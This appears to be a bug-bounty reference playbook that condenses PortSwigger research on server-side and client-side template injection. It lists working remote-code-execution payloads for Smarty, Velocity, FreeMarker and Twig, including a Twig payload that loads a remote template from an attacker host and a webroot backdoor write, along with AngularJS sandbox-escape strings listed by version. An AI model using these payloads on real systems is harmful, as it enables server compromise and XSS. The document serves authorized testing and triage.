# Template Injection (SSTI/CSTI) — Research Articles Compendium

> Consolidated from 4 PortSwigger Research articles (2015–2016, Kettle + Heyes): SSTI methodology + per-engine RCE, template-injection overview (CSTI vs SSTI), and AngularJS client-side template injection with full sandbox-escape version list. Reference playbook for bug bounty testing/triage.

## Article Map

| Article | Year | Focus |
|---|---|---|
| server-side-template-injection | 2015 | Detect→Identify→Exploit methodology; per-engine RCE (FreeMarker/Velocity/Smarty/Twig/sandboxed Twig) |
| template-injection | 2015 | CSTI vs SSTI classification, research index, CSP-bypass relevance |
| xss-without-html-client-side-template-injection-with-angularjs | 2016 | CSTI detection, charAt backdoor technique, per-version sandbox escape list |
| adapting-angularjs-payloads (referenced) | 2016 | Real-world restricted CSTI exploitation |

## Methodology (SSTI, Kettle 2015)

**Detect** — two contexts:
- Plaintext context: XSS is the cue for deeper probes. Template-agnostic probes across engines: `{{7*7}}` / `${7*7}` / `<%= 7*7 %>` / `{7*7}` → 49
- Code context (harder — no XSS cue): `personal_greeting=username` → break out of statement: `username}}<tag>` — blank result/error = probe hit. Verify param is NOT direct XSS first.

**Identify** — decision-tree (Burp Scanner automates):
- `{{7*'7'}}` → 49 = Twig | 7777777 = Jinja2
- `{{self}}` error leaking class name = Twig/Smarty object leak
- Error messages identify engine when not suppressed

**Exploit pipeline** — Read docs ("Security Considerations" = goldmine) → Explore (self/namespace object; brute-force variable names w/ SecLists burp-parameter-names wordlist; developer-supplied objects = sensitive, check EVERY template variant) → Attack (audit exposed methods in app context: file read/write, object creation, RFI, priv-esc).

**Per-engine payloads (2015 zerodays):**
- **Smarty (PHP)**: unsandboxed `{php}echo \`id\`;{/php}`. Secure mode: `{self::getStreamVariable("file:///etc/passwd")}` (arbitrary file read); `{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php backdoor ?>",self::clearConfig())}` — webroot backdoor
- **Velocity (Java)**: `$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()`; stdout capture: `#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end`
- **FreeMarker (Java)**: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` — docs explicitly warn new() enables this (TemplateClassResolver bypass)
- **Twig (PHP)**: `{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}` (needs allow_url_include); getFilter call_user_func route: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- **Sandboxed Twig**: SecurityPolicy allows any method on Twig_TemplateInterface → `_self.displayBlock` gadget: `{{_self.displayBlock("id",[],{"id":[userObject,"vulnerableMethod"]})}}` = arbitrary method call bypassing whitelist

## Client-Side (AngularJS CSTI, Heyes 2016)

**Detection**: page loads Angular (`ng-app` in DOM above injection point) + user input reflected (even HTML-encoded!) → inject `{{1+1}}` → renders "2" = CSTI. Angular expressions are JS-like; sandbox escape → arbitrary JS = XSS on sites where htmlspecialchars "fixed" the XSS.

**Core escape technique (charAt backdoor)** — pollute String prototype so parser rewrites produce attacker code:
```
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)')+''}}
```
Parser string-literal handling uses charAt → returns joined output → JS syntax error in REWRITTEN code = code injection into rewritten output.

**Sanitizer backdoor pattern** — overwrite native fn with existing function (no function literals in Angular expressions): `'a'.constructor.fromCharCode=[].join;'a'.constructor[0]='<iframe onload=alert(1)>'` — every fromCharCode call returns payload (works against ng-bind-html sanitizer).

**Version escapes** (full list on PortSwigger XSS cheat sheet; sandbox REMOVED in Angular ≥1.6 — CSTI there = direct JS execution, no escape needed):
- 1.0.1-1.1.5: `{{constructor.constructor('alert(1)')()}}`
- 1.2.19-1.2.23: `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}`
- 1.2.24-1.2.29: `{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}`
- 1.3.1-1.3.2 / 1.3.3-1.3.18: `{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}`
- CSP mode escapes exist separately (cheat sheet "AngularJS CSP bypasses")

**Key context notes**: Angular 1.5.0+ patched the 2015 escapes but sandbox was never a security boundary ("not intended to stop attackers"); server-side Angular rendering = CSTI payloads become SSTI = RCE. Other frameworks (Vue/Handlebars client) similar probe logic.

## High-Value Target List

- Email/marketing template editors, wiki/CMS/review systems with custom markup
- PDF/invoice generators (user text → template render)
- Error pages rendering unsuppressed engine errors
- AngularJS legacy apps (pre-1.6) reflecting input in attribute/body
- Import/export features that round-trip user content through templates
- Framework version leaks: JS bundle source maps / `angular.js?v=x.y.z`

## By-Design / SKIP Filters

- `{{7*7}}` reflected literally, no evaluation = no template injection (INFO)
- Sandboxed engine w/o documented escape at target's version ⇒ chain likely dead; probes only = INFO, label [THEORETICAL]
- Angular ≥1.6: sandbox gone but ng-app context required — no ng-app above injection = no CSTI
- Self-XSS-only CSTI (own profile template, no luring vector) = LOW
- Template injection in internal/localhost-only tool = scope check first (viability gate)
- Old per-version escapes vs patched framework version: verify version BEFORE claiming exploitability

## Severity Guide

- SSTI → RCE (any engine, unsandboxed or escaped sandbox): CRITICAL
- SSTI → file read/write (Smarty getStreamVariable, Twig setCache): HIGH
- SSTI → info disclosure only (self/env object leak, config): MEDIUM
- CSTI + sandbox escape → XSS (pre-1.6 Angular): MEDIUM-HIGH (HIGH if token theft/session)
- CSTI (Angular ≥1.6) → direct JS execution: MEDIUM-HIGH, same as reflected XSS
- Probe success, engine identified, no exploit chain: LOW/INFO
- Probe fails / literal reflection: INFO

## Reporting Checklist

- [ ] Show math probe evaluated (49/7777777) + engine identification step
- [ ] RCE claim: command output visible in response (whoami/id/sleep timing) — not just payload echo
- [ ] File read: show real file contents (/etc/passwd, proc/self/environ redacted)
- [ ] CSTI: screenshot with ng-app context + rendered expression, plus alert/PoC execution
- [ ] State engine + version + why sandbox (if any) doesn't block the chain
- [ ] Sensitive-data claims: blur/redact PII in screenshots, state data types accessed
- [ ] Blocked chain (probe only) ⇒ INFORMATIONAL per master KB, no HIGH claim

> Master KB: agent-kb-bounty-exploit-master.md authority > SKILL.md. Unproven/blocked chain = INFORMATIONAL.
